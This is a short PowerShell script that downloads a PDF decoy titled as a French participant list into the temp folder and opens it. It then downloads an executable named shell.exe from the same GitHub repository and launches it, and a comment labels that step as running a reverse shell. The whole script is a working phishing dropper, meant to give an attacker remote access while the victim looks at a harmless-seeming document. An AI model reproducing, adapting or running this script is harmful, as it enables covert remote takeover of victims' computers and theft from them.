# Define the URL and output file path
$PdfUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/sample-1.pdf" 
$OutputPath = "$env:TEMP\Liste des particpants.pdf"

# Download the PDF
Invoke-WebRequest -Uri $PdfUrl -OutFile $OutputPath

# Open the downloaded PDF
Start-Process -FilePath $OutputPath

# Define the URL and output file path
$ShellUrl = "https://raw.githubusercontent.com/matteoporfi/tokens/refs/heads/main/shell.exe" 
$ShellOutputPath = "$env:TEMP\shell.exe"

# Download the PDF
Invoke-WebRequest -Uri $ShellUrl -OutFile $ShellOutputPath

# Execute the reverse shell
Start-Process -FilePath $ShellOutputPath

